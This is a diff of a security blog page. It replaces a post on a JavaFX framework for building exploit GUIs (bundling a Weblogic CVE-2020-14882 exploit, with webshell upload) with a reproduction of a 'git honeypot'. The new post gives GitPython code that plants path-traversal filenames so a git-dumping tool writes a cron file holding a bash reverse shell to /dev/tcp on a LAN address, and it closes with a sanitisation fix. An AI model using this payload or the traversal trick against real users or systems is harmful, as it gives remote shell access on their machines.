@@ -18,7 +18,7 @@
   <meta name="author" content="yhy">
   <meta name="keywords" content="">
   
-  <title>图形化漏洞利用Demo-JavaFX版 - yhy&#39;s blog</title>
+  <title>git 蜜罐复现 - yhy&#39;s blog</title>
 
   <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
 
@@ -187,7 +187,7 @@
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="图形化漏洞利用Demo-JavaFX版">
+            <span class="h2" id="subtitle" title="git 蜜罐复现">
               
             </span>
 
@@ -202,8 +202,8 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2021-03-23 10:43" pubdate>
-        2021年3月23日 上午
+      <time datetime="2021-08-09 20:30" pubdate>
+        2021年8月9日 晚上
       </time>
     </span>
   
@@ -214,7 +214,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      936 字
+      353 字
     </span>
   
 
@@ -224,7 +224,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      11
+      5
        分钟
     </span>
   
@@ -262,72 +262,51 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">图形化漏洞利用Demo-JavaFX版</h1>
+            <h1 style="display: none">git 蜜罐复现</h1>
             
               <p class="note note-info">
                 
-                  本文首发于微信公众号：<a target="_blank" href="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210320180703.jpg" rel="nofollow noopener noopener">谁不想当剑仙</a></br></br>本文最后更新于：2021年8月6日 上午
+                  本文首发于微信公众号：<a target="_blank" href="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210320180703.jpg" rel="nofollow noopener noopener">谁不想当剑仙</a></br></br>本文最后更新于：2021年8月10日 上午
                 
               </p>
             
             <div class="markdown-body">
               <blockquote>
-<p>  山高水长,天涯未远,江湖再见</p>
+<p>  好久不见</p>
 </blockquote>
-<h2 id="0x01-这是个嘛？"><a href="#0x01-这是个嘛？" class="headerlink" title="0x01 这是个嘛？"></a>0x01 这是个嘛？</h2><p>这是一个构建图形化漏洞利用的一个项目，已经写好架子，只需要往里填充exp即可，帮助安全人员快速构建一个图形化的、跨平台的漏洞利用工具。</p>
-<p>虽然有很多优秀的命令行利用工具，但我觉得还是带界面的方便。</p>
-<p>使用本项目，你不需要懂太多Java语言，只需要了解基本的语法，参考自带的EXP例子，即可快速开发一款<strong>属于你自己</strong>的漏洞利用工具。</p>
-<h2 id="0x02-Demo"><a href="#0x02-Demo" class="headerlink" title="0x02 Demo"></a>0x02 Demo</h2><p>废话不多说，先上效果图，自带CVE-2020-14882 Weblogic远程代码执行漏洞</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210327184310.gif" srcset="/img/loading.gif" lazyload alt="JavaFX"></p>
-<h2 id="0x03-编写属于你的图像化漏洞利用工具"><a href="#0x03-编写属于你的图像化漏洞利用工具" class="headerlink" title="0x03 编写属于你的图像化漏洞利用工具"></a>0x03 编写属于你的图像化漏洞利用工具</h2><h4 id="3-1-项目结构"><a href="#3-1-项目结构" class="headerlink" title="3.1 项目结构"></a>3.1 项目结构</h4><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apl">.<br>├── ExpDemo-JavaFX.iml<br>├── pom.xml	maven工程的基本文件<br>└── src	<br>    └── main<br>        ├── deploy<br>        │   └── ExpDemo-JavaFX-1.0.icns<br>        ├── java<br>        │   └── com<br>        │       └── yhy<br>        │           ├── Controller.java	 控制JavaFX图形化界面的各种显示、事件等，核心代码<br>        │           ├── Main.java     JavaFX 应用程序的入口<br>        │           ├── core    核心代码文件夹<br>        │           │   ├── CVE_2020_14882.java	 exp编写示例<br>        │           │   ├── Constants.java		  一些常量信息<br>        │           │   ├── ExploitInterface.java	 exp 编写要实现的接口<br>        │           │   ├── Job.java	批量检查的线程池<br>        │           │   └── VulInfo.java    映射批量检查界面中的表格，信息基本类<br>        │           └── tools		工具文件夹<br>        │               ├── HttpTool.java     HTTP 请求封装<br>        │               ├── MyCERT.java    HTTPS 请求证书设置<br>        │               └── Tools.java	    一些处理函数<br>        └── resources	资源文件夹<br>            ├── sample.fxml	 avaFX图形化界面描述文件<br>            ├── sec.png<br>            └── weixin.jpg<br></code></pre></div></td></tr></table></figure>
+<h2 id="0x01-git-蜜罐复现"><a href="#0x01-git-蜜罐复现" class="headerlink" title="0x01 git 蜜罐复现"></a>0x01 git 蜜罐复现</h2><p>具体原理请看 <a target="_blank" rel="noopener" href="https://drivertom.blogspot.com/2021/08/git.html?m=1">https://drivertom.blogspot.com/2021/08/git.html?m=1</a></p>
+<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> git<br><br>repo = git.Repo.init(path=<span class="hljs-string">&quot;.&quot;</span>)<br><br>repo.index.add(items=[<span class="hljs-string">&#x27;../../git_poc.txt&#x27;</span>])<br><br>repo.index.commit(<span class="hljs-string">&#x27;commit&#x27;</span>)<br></code></pre></div></td></tr></table></figure>
+
+<p><code>python3 -m pip install GitPython</code></p>
+<p>python3 运行, 生成Poc </p>
+<blockquote>
+<p>  在当前目录的../../的目录下必须有git_poc.txt</p>
+</blockquote>
+<p>比如当前脚本目录为 <code>/Users/yhy/Desktop/gitpoc</code>,那么在<code>/Users/yhy</code>要存在<code>git_poc.txt</code></p>
+<p>然后将 <strong>.git</strong> 文件夹整体拖入网站根目录下</p>
+<p>效果：防止干扰我直接在虚拟机中运行 <a target="_blank" rel="noopener" href="https://github.com/0xHJK/dumpall.git">dumpall</a> 工具</p>
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210809174743.png" srcset="/img/loading.gif" lazyload alt="image-20210809154939407"></p>
+<p>没有在 <strong>dumpall/192.168.100.250_8080</strong> 目录下生成文件，而是进行了<strong>目录穿越</strong>,在原计划（dumpall/192.168.100.250_8080）两层外的目录下生成了git_poc</p>
+<h3 id="1-1-计划任务反弹shell"><a href="#1-1-计划任务反弹shell" class="headerlink" title="1.1 计划任务反弹shell"></a>1.1 计划任务反弹shell</h3><p>先在/var/spool/cron/crontabs/ 下新建名为 root 的反弹shell代码文件。</p>
+<p><code>* * * * * /bin/bash -i &gt;&amp; /dev/tcp/192.168.100.250/8888 0&gt;&amp;1</code></p>
+<p>然后将<code>repo.index.add(items=[&#39;../../git_poc.txt&#39;])</code> 中的<code>../../git_poc.txt</code> 替换, 使用多个**../**,确保返回到根目录 </p>
+<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">repo.index.add(items=[<span class="hljs-string">&#x27;../../../../../../../../../../../../../../../../../../../../../../../../../../../var/spool/cron/crontabs/root&#x27;</span>])<br></code></pre></div></td></tr></table></figure>
+
+<blockquote>
+<p>  /var/spool/cron/root (centos系列主机)</p>
+<p>  /var/spool/cron/crontabs/root (debian系列主机)</p>
+</blockquote>
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210809174751.png" srcset="/img/loading.gif" lazyload alt="image-20210809173416573"></p>
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210809174728.png" srcset="/img/loading.gif" lazyload alt="image-20210809173349713"></p>
+<h2 id="0x02-修复"><a href="#0x02-修复" class="headerlink" title="0x02 修复"></a>0x02 修复</h2><p>这就是个目录穿越漏洞，这里简单粗暴的将 <strong>../</strong> 全部删除，以dumpall为例 </p>
+<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># dumpall/dumper.py</span><br>filename = <span class="hljs-built_in">str</span>(filename).replace(<span class="hljs-string">&quot;../&quot;</span>, <span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot;..\\&quot;</span>, <span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot;..;/&quot;</span>, <span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot;..;\\&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br></code></pre></div></td></tr></table></figure>
 
 
 
-<h4 id="3-2-编写EXP"><a href="#3-2-编写EXP" class="headerlink" title="3.2 编写EXP"></a>3.2 编写EXP</h4><p>编写EXP时，要使用 <code>implements</code>实现<code>ExploitInterface</code>接口，实现接口中的几个方法</p>
-<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210327194809.png" srcset="/img/loading.gif" lazyload alt="image-20210327190517731"></p>
-<ul>
-<li>  checkVUL        使用poc 检查是否漏洞</li>
-<li>  exeCMD          使用exp执行命令</li>
-<li>  uploadFile        使用命令执行 写webshell，上传文件</li>
-<li>  getWebPath     获取网站的web目录，供上传文件使用</li>
-<li>  isVul                是否存在漏洞，检查时会根据结构自动赋值，供后续调用</li>
-</ul>
-<p>EXP具体编写请参考 <code>src/main/java/com/yhy/core/CVE_2020_14882.java</code> 示例</p>
-<p>当编写完EXP后，转到 <code>src/main/java/com/yhy/core/Constants.java</code> 文件，修改<code>CVES</code> 变量，即图像化界面中可供选择的漏洞列表</p>
-<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210327194816.png" srcset="/img/loading.gif" lazyload alt="image-20210327191129699"></p>
-<p>之后进入<code>src/main/java/com/yhy/Controller.java</code> 和 <code>com/yhy/tools/Tools.java</code> 文件编写逻辑</p>
-<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210327210741.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2021-03-27_21-04-14"></p>
-<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210327210756.png" srcset="/img/loading.gif" lazyload alt="111111111111111"></p>
-<p>编写完后，可以直接执行<code>Main</code>类, 查看是否正常运行。</p>
-<h4 id="3-3-部署，发布"><a href="#3-3-部署，发布" class="headerlink" title="3.3 部署，发布"></a>3.3 部署，发布</h4><p>当一切编写完成，bug修复完毕，在项目根目录下执行 <code>mvn jfx:jar</code> 即可生成 jar文件。</p>
-<p>对方没有Java环境，不想安装怎么办？</p>
-<p>使用<code>mvn jfx:native</code> 命令生产对应平台的文件，比如Mac 下，执行命令<code>mvn jfx:native</code> 命令就会在 <strong>target/jfx/native</strong> 目录下生成打包后应用，带可执行文件，带 JRE 运行环境。</p>
-<p> <code>mvn clean</code> 用于清除生成的文件。</p>
-<h2 id="0x04-界面修改"><a href="#0x04-界面修改" class="headerlink" title="0x04 界面修改"></a>0x04 界面修改</h2><p>对界面不满意，或者想添加其他功能</p>
-<p>安装 JavaFx Scene Builder</p>
-<p><a target="_blank" rel="noopener" href="https://www.oracle.com/java/technologies/javafxscenebuilder-1x-archive-downloads.html">https://www.oracle.com/java/technologies/javafxscenebuilder-1x-archive-downloads.html</a></p>
-<p>安装完，在IDEA中右键打开(设置好JavaFx Scene Builder的路径)</p>
-<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210327194824.png" srcset="/img/loading.gif" lazyload alt="image-20210327192030204"></p>
-<p>打开后</p>
-<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210327194835.png" srcset="/img/loading.gif" lazyload alt="image-20210327192230881"></p>
-<p>想添加什么控件，直接从Scene Builder的左边控件栏中拖拽一个到界面设计区域，然后只需要关心右侧栏第三个<code>Code</code>的<code>fx:id</code> 和<code>On Action</code> </p>
-<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210327194840.png" srcset="/img/loading.gif" lazyload alt="image-20210327192402177"></p>
-<p>比如想添加一个 输入框，搜索框查询，然后拖一个 <code>TextField</code> 控件到设计区</p>
-<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210327194844.png" srcset="/img/loading.gif" lazyload alt="image-20210327192547983"></p>
-<p>为这个 <code>TextField</code> 设置一个<code>fx:id</code> ，然后<code>Ctrl+s</code>保存,  <code>sample.fxml</code> 会做出相应的更改，不需要关心</p>
-<p>之后到<code>src/main/java/com/yhy/Controller.java</code> 文件编写逻辑</p>
-<ol>
-<li><p>使用<code>@FXML</code>注解，声明变量</p>
-<p> <img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210327194848.png" srcset="/img/loading.gif" lazyload alt="image-20210327192937964"></p>
-</li>
-<li><p>在函数中使用变量</p>
-<p> 使用<code>this.cmd.getText() </code>获取输入的值</p>
-<p> 使用<code>this.cmd.setText() </code>设置值</p>
-<p> <img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210327194852.png" srcset="/img/loading.gif" lazyload alt="image-20210327193148639"></p>
-<p> 其他控件使用，请参考<code>src/main/java/com/yhy/Controller.java</code> ，或者自行学习JavaFX。</p>
-</li>
-</ol>
-<h2 id="0x05-更新"><a href="#0x05-更新" class="headerlink" title="0x05 更新"></a>0x05 更新</h2>
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210809174721.png" srcset="/img/loading.gif" lazyload alt="image-20210809174123558"></p>
+<h2 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h2><p><a target="_blank" rel="noopener" href="https://drivertom.blogspot.com/2021/08/git.html?m=1">https://drivertom.blogspot.com/2021/08/git.html?m=1</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/0xHJK/dumpall">https://github.com/0xHJK/dumpall</a> </p>
+
             </div>
             <hr>
             <div>
@@ -336,7 +315,9 @@
                   <div class="post-meta mr-3">
                     <i class="iconfont icon-category"></i>
                     
-                      <a class="hover-with-bg" href="/categories/GitHub%E5%B7%A5%E5%85%B7/">GitHub工具</a>
+                      <a class="hover-with-bg" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a>
+                    
+                      <a class="hover-with-bg" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E8%9C%9C%E7%BD%90/">蜜罐</a>
                     
                   </div>
                 
@@ -344,7 +325,9 @@
                   <div class="post-meta">
                     <i class="iconfont icon-tags"></i>
                     
-                      <a class="hover-with-bg" href="/tags/GitHub%E5%B7%A5%E5%85%B7/">GitHub工具</a>
+                      <a class="hover-with-bg" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a>
+                    
+                      <a class="hover-with-bg" href="/tags/%E8%9C%9C%E7%BD%90/">蜜罐</a>
                     
                   </div>
                 
@@ -363,18 +346,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2021/04/04/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-F5%20BIG-IP%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2021-22986)/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">漏洞复现-F5 BIG-IP远程代码执行漏洞(CVE-2021-22986)</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2021/03/18/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-Apache%20Solr%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/">
-                        <span class="hidden-mobile">漏洞复现-Apache Solr 任意文件读取漏洞</span>
+                      <a href="/2021/07/01/Java%20ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BCommonsCollections5(%E5%9B%9B)/">
+                        <span class="hidden-mobile">Java ysoserial学习之CommonsCollections5(四)</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
